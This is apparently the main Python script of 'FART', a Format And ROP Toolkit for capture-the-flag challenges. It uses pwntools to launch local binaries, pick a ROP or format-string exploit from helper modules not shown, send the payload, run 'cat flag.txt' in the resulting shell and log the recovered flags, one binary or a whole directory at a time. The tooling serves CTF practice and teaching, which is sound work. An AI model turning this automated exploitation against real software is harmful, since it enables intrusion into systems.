#!/usr/bin/env python3
from pwn import *
import sys
from analyze import *
import Fart_FMT
import Fart_ROP
import time
import traceback
from multiprocessing import Process
import os
import progressbar
from tabulate import tabulate
import sys
from Print import Print
import argparse
import hashlib

logging.getLogger('pwnlib').setLevel(logging.WARNING)

banner = '''
   ad88                                
  d8"                           ,d     
  88                            88     
MM88MMM ,adPPYYba, 8b,dPPYba, MM88MMM  
  88    ""     `Y8 88P'   "Y8   88     
  88    ,adPPPPP88 88           88     
  88    88,    ,88 88           88,    
  88    `"8bbdP"Y8 88           "Y888
  
  Format And ROP Toolkit \U0001F4A8 
'''


fire = "\U0001F525"

gs = '''
b win
continue
'''
context.terminal = ["tmux", "splitw", "-h"]

def start(binary):
    e = context.binary = ELF(binary)
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)

def exploit(analyize, v_lvl):
    binary = analyze.binary
    p = start(binary)
    payload = None
    
    fart_print.info("Determining vulnerability type")
    if not analyze.has_leak():
        rop = Fart_ROP.ROP(analyze, v_lvl)
        try:
            send(rop.build_exploit(), p, analyze)
        except EOFError:
            fart_print.warning("Possible alignment issue! Realigning and trying again")
            p2 = process(binary)
            send(rop.build_exploit(failed=True), p, analyze)
            p2.close()
    else:
        fmt = Fart_FMT.FMT(analyze, v_lvl)
        send(fmt.build_exploit(), p, analyze)

    p.close()

def send(payload, p, analyze):
    if payload:
        p.sendline(payload)
        if analyze.has_binsh():
            sleep(0.1)
            p.sendline(b"cat flag.txt")
        p.recvuntil(b"flag{")
        char = "{"
        flag = f"flag{char}{p.recvuntil(b'}').decode('utf-8')}"
        fart_print.flag(f"{analyze.bin_hash},{analyze.bin_name},{flag}")

def __libc_fart_main(binary, v_lvl, bin_hash):
    global analyze
    try:
        fart_print.info("Finding interesting strings and symbols")
        analyze = Analyze(binary, bin_hash)
        exploit(analyze, v_lvl)
    except Exception as e:
        fart_print.warning("Well this stinks! We've encountered an exception we don't know how to handle!")
        fart_print.error("Exception Type: " + str(e.__class__.__name__))
        fart_print.error("Exception Message: " + str(e))
        fart_print.error(traceback.format_exc())

def get_opts():

    parser = argparse.ArgumentParser()
    parser.add_argument("-b", "--binary", type=str, help="Exploit a single binary")
    parser.add_argument("-d", "--directory", type=str, help="Exploit all binaries in a directory")
    parser.add_argument("-v", "--verbosity", type=int, help="Set the print verbosity level (0-4)")

    pargs = parser.parse_args()
    
    return pargs

def check_pot_file(data, binary, bin_hash):
    bin_name = binary.split("/")[-1]
    for line in data:
        (h, b, f) = line.split(",")
        if bin_name in b and bin_hash in h:
            fart_print.info("This binary has already been solved!")
            return True
    return False
    

def generate_md5sum(binary):
    bin_name = binary.split("/")[-1]
    fart_print.info(f"Calculating MD5 sum of {bin_name}")
    return hashlib.md5(open(binary, "rb").read()).hexdigest()

if __name__ == "__main__":
    opts = get_opts()
     
    v_lvl = opts.verbosity
    if not v_lvl:
        opts.verbosity = 0

    bins_dir = None     
    if opts.directory:
        bins_dir = opts.directory
        fart_print = Print(v_level=0)
    else:
        fart_print = Print(v_level=v_lvl)
    
    bins = []
    processes = []
 
    fart_print.green(banner)
    
    try:
        pot_fd = open(".flags.pot", "r")
    except FileNotFoundError:
        fart_print.warning("No flag pot file found! Generating one now.")
        os.system("touch .flags.pot") 
        pot_fd = open(".flags.pot", "r")

    fart_print.info("Retrieving previously solved binaries")
    pot_data = pot_fd.read().split("\n")[:-1]
    pot_fd.close()

    if bins_dir:
        # Disable printing when running multiprocessed
        for binary in os.listdir(bins_dir):    
            bins.append(bins_dir + "/" + binary)
    
        for binary in bins:
            bin_hash = generate_md5sum(binary)

            if not check_pot_file(pot_data, binary, bin_hash):
                proc = Process(target=__libc_fart_main, args=(binary,0,bin_hash))
            
                proc.start()
                processes.append(proc)
    else:
        if opts.binary:
            binary = opts.binary
        else:
            binary = args.BIN

        bin_hash = generate_md5sum(binary)
        if not check_pot_file(pot_data, binary, bin_hash):
            __libc_fart_main(binary, v_lvl, bin_hash)
    
    # Quiet for the progress bar
    fart_print.v_level = 0
    bar = progressbar.ProgressBar(max_value=len(bins), fd=sys.stdout)
    
    num = 0
    while True:
        for proc in processes:
            if not proc.is_alive():
                processes.remove(proc)
                num += 1
                bar.update(num)
        if len(processes) == 0:
            break
    
    with open(".flags.pot", "r") as fd:
        flags = fd.read().split("\n")[:-1]
        table = []
        for flag in flags:
            table.append(flag.split(","))
    
    print("")
    print("")
    print(tabulate(table, headers=["MD5", "Binary", "Flag"], showindex="always"))
    
    fart_print.v_level = 4
    if bins:
        fart_print.info(f"Flags recovered: {len(flags)}/{len(bins)}")
    else:
        fart_print.info(f"Flags recovered: {len(flags)}/1")
